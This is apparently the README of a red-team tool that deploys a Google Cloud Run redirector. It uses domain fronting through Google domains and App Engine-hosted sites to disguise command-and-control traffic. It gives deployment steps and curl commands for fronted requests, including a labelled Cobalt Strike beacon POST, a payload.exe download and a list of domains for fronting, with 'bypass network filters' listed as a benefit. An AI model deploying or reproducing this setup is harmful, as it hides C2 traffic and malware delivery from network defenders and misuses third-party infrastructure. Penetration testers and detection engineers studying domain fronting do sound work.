# 🚀 Google Cloud Redirector

A lightweight HTTP/HTTPS redirector designed for Google Cloud Run that exploits remaining domain fronting capabilities in Google's infrastructure. While Google has patched domain fronting on their CDN product for customer infrastructure, it still works against certain Google-owned infrastructure and third-party sites hosted on Google App Engine (like api.snapchat.com). This tool leverages these remaining vectors to obscure traffic destinations, including through Google services like Meet and Chrome update infrastructure.

## Table of Contents

- [🚀 Google Cloud Redirector](#-google-cloud-redirector)
  - [Table of Contents](#table-of-contents)
  - [⚡ How Domain Fronting Works](#-how-domain-fronting-works)
  - [📦 Installation](#-installation)
  - [🛠️ Deployment](#️-deployment)
    - [Quick Deploy](#quick-deploy)
    - [Get Your Redirector URL](#get-your-redirector-url)
  - [🌐 Using Domain Fronting](#-using-domain-fronting)
    - [Basic Usage](#basic-usage)
    - [Supported Google Domains](#supported-google-domains)
    - [Advanced Examples](#advanced-examples)
  - [✨ Features](#-features)
  - [🏗️ Architecture](#️-architecture)
  - [📊 Monitoring & Management](#-monitoring--management)
    - [List Redirectors](#list-redirectors)
    - [View Logs](#view-logs)
    - [Remove Redirectors](#remove-redirectors)
  - [🧪 Testing](#-testing)
    - [Local Development](#local-development)
    - [Testing Domain Fronting](#testing-domain-fronting)
  - [🔧 Configuration](#-configuration)
  - [⚠️ Security Considerations](#️-security-considerations)
  - [🤝 Contributing](#-contributing)
  - [📄 License](#-license)

## ⚡ How Domain Fronting Works

Domain fronting leverages the fact that many CDNs and cloud providers route traffic based on the HTTP Host header rather than the domain used for the initial TLS connection. While Google has fixed domain fronting on their CDN product for customer infrastructure, this redirector exploits the fact that it still works against certain Google-owned infrastructure and third-party services hosted on Google App Engine.

This means you can still use domain fronting through:
- Select Google-owned domains and services
- Third-party sites hosted on Google App Engine (e.g., api.snapchat.com)
- Other Google infrastructure where Host header routing remains functional

```
1. Client connects to google.com or api.snapchat.com (TLS handshake)
2. Client sends Host header: your-redirector.us-central1.run.app
3. Google infrastructure routes to your Cloud Run service
4. Your redirector forwards to your backend server
```

**Traffic Flow:**
```
Client → google.com/appengine site → GCP Infrastructure → Cloud Run Redirector → Backend Server
         (TLS Domain)                (Routes by Host header)
```

## 📦 Installation

### Prerequisites

- [Google Cloud SDK](https://cloud.google.com/sdk/docs/install) installed and authenticated
- [Docker](https://docs.docker.com/get-docker/) installed
- Active GCP project with billing enabled
- [Go 1.21+](https://golang.org/dl/) (optional, for local development)

### Quick Setup

```bash
# Clone the repository
git clone https://github.com/praetorian-inc/google-redirector
cd google-redirector

# Configure your GCP project
gcloud config set project YOUR-PROJECT-ID
```

## 🛠️ Deployment

### Quick Deploy

1. **Set your backend URL** (where traffic should be forwarded):
   ```bash
   export BACKEND_URL=https://your-c2-server.com
   ```

2. **Deploy the redirector**:
   ```bash
   ./deploy.sh my-redirector
   ```

3. **Save your redirector URL** (output from deploy script):
   ```
   Your redirector URL: redirector-my-redirector-abc123xyz.us-central1.run.app
   ```

### Get Your Redirector URL

If you forgot your redirector URL:
```bash
gcloud run services describe redirector-my-redirector --region us-central1 --format 'value(status.url)'
```

## 🌐 Using Domain Fronting

### Basic Usage

Once deployed, you can use domain fronting to access your redirector through Google domains:

```bash
# Basic GET request
curl -H "Host: redirector-my-redirector-abc123xyz.us-central1.run.app" \
     https://www.google.com/api/data

# POST request with data
curl -X POST \
     -H "Host: redirector-my-redirector-abc123xyz.us-central1.run.app" \
     -H "Content-Type: application/json" \
     -d '{"user":"test","pass":"123"}' \
     https://client2.google.com/login

# Custom headers
curl -H "Host: redirector-my-redirector-abc123xyz.us-central1.run.app" \
     -H "X-Custom-Header: value" \
     -H "User-Agent: Mozilla/5.0" \
     https://storage.googleapis.com/path/to/resource
```

### Supported Domains for Domain Fronting

The following domains can be used for domain fronting with Google Cloud infrastructure:

**Google-Owned Domains:**
- `www.google.com` - General purpose fronting
- `client2.google.com` - Software update endpoints
- `storage.googleapis.com` - Cloud storage services
- `accounts.google.com` - Authentication services
- `apis.google.com` - API service endpoints
- `youtube.com` - Video platform
- `dl.google.com` - Download services
- `play.google.com` - Play Store services
- `meet.google.com` - Video conferencing platform
- `*.googleapis.com` - Various Google API endpoints

**App Engine Hosted Services (*.appspot.com):**
- `api.snapchat.com` → `feelinsonice-hrd.appspot.com`
- Other third-party services that resolve to `*.appspot.com`

**Note:** You can identify App Engine hosted services by checking if they have CNAMEs pointing to `*.appspot.com`. These services are particularly useful for domain fronting as they route through Google's App Engine infrastructure.

### Advanced Examples

**C2 Beacon Example:**
```bash
# Cobalt Strike HTTP beacon through domain fronting
curl -X POST \
     -H "Host: redirector-c2-abc123xyz.us-central1.run.app" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
     -H "Content-Type: application/octet-stream" \
     --data-binary @beacon.bin \
     https://client2.google.com/updates/check
```

**Using App Engine Hosted Sites:**
```bash
# Through Snapchat's API (hosted on App Engine)
curl -H "Host: redirector-api-abc123xyz.us-central1.run.app" \
     -H "User-Agent: Snapchat/11.0.0 (iPhone; iOS 14.0)" \
     https://api.snapchat.com/v1/updates
```

**File Download Example:**
```bash
# Download file through domain fronting
curl -H "Host: redirector-files-abc123xyz.us-central1.run.app" \
     -o payload.exe \
     https://dl.google.com/software/update.exe
```

**Persistent Connection Example:**
```bash
# WebSocket-like persistent connection
curl -H "Host: redirector-stream-abc123xyz.us-central1.run.app" \
     -H "Connection: keep-alive" \
     -N https://apis.google.com/stream
```

## ✨ Features

| Feature | Description | Benefit |
|---------|-------------|---------|
| 🌐 **Domain Fronting** | Route through Google domains | Bypass network filters |
| 🔄 **Full HTTP Proxy** | Supports all HTTP methods | Complete protocol support |
| 📝 **Request Preservation** | Forwards headers, body, params | Transparent proxying |
| 🚀 **Auto-scaling** | Google Cloud Run serverless | Handles traffic spikes |
| 🔒 **TLS Passthrough** | Works with self-signed certs | Flexible backend support |
| ⚡ **Low Latency** | Minimal Go binary | Fast request processing |
| 🐳 **Containerized** | Docker-based deployment | Easy management |

## 🏗️ Architecture

```
┌─────────────────┐
│     Client      │
└────────┬────────┘
         │ HTTPS (TLS: google.com)
         │ Host: your-redirector.run.app
┌────────▼────────┐
│  Google Edge    │
│   (CDN/LB)      │
└────────┬────────┘
         │ Routes by Host header
┌────────▼────────┐
│  Cloud Run      │
│  (Redirector)   │
└────────┬────────┘
         │ HTTPS
┌────────▼────────┐
│ Backend Server  │
│   (C2/API)      │
└─────────────────┘
```

## 📊 Monitoring & Management

### List Redirectors

```bash
# List all your redirectors
gcloud run services list --region us-central1 --filter="metadata.name:redirector-"

# Get details for specific redirector
gcloud run services describe redirector-my-redirector --region us-central1
```

### View Logs

```bash
# Real-time logs
gcloud run services logs tail redirector-my-redirector --region us-central1

# Search logs
gcloud logging read "resource.type=cloud_run_revision AND resource.labels.service_name=redirector-my-redirector" --limit 50
```

### Remove Redirectors

```bash
# Remove a specific redirector
./uninstall.sh my-redirector

# Remove all redirectors (be careful!)
for name in $(gcloud run services list --region us-central1 --filter="metadata.name:redirector-" --format="value(metadata.name)" | sed 's/redirector-//'); do
    ./uninstall.sh $name
done
```

The uninstall script will:
1. Delete the Cloud Run service
2. Delete the container image from Artifact Registry
3. Keep the shared Artifact Registry repository (used by all redirectors)

To see what will be deleted:
```bash
gcloud run services describe redirector-my-redirector --region us-central1
```

## 🧪 Testing

### Local Development

```bash
# Test locally with httpbin
export BACKEND_URL=https://httpbin.org
go run main.go

# In another terminal
curl -H "Host: redirector-test.run.app" http://localhost:8080/get
```

### Testing Domain Fronting

**Test Script:**
```bash
#!/bin/bash
REDIRECTOR_URL="redirector-my-redirector-abc123xyz.us-central1.run.app"

# Test various Google domains
for domain in www.google.com client2.google.com storage.googleapis.com; do
    echo "Testing $domain..."
    curl -s -o /dev/null -w "%{http_code} - %{time_total}s\n" \
         -H "Host: $REDIRECTOR_URL" \
         https://$domain/test
done
```

**Verify Headers Are Forwarded:**
```bash
# Your backend should receive all original headers
curl -H "Host: redirector-test-abc123xyz.us-central1.run.app" \
     -H "X-Original-Header: test-value" \
     -v https://client2.google.com/headers
```

## 🔧 Configuration

### Environment Variables

| Variable | Description | Required | Example |
|----------|-------------|----------|---------|
| `BACKEND_URL` | Your backend server URL | ✅ | `https://c2.mydomain.com` |
| `PORT` | Listen port (auto-set by Cloud Run) | ❌ | `8080` |

### Deployment Settings

Configured in `deploy.sh`:
- **Region**: us-central1 (change for different regions)
- **Memory**: 512Mi (increase for high traffic)
- **CPU**: 1 vCPU
- **Concurrency**: 100 requests per instance
- **Min Instances**: 0 (cold start possible)
- **Max Instances**: 10 (adjustable)

### Customization

Edit `deploy.sh` to modify deployment parameters:
```bash
# Change region (may affect domain fronting compatibility)
--region us-east1

# Increase resources for high traffic
--memory 2Gi --cpu 2

# Always keep warm instance
--min-instances 1
```

## 📄 License

This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.

---

**Made with ❤️ by [Praetorian](https://praetorian.com)**
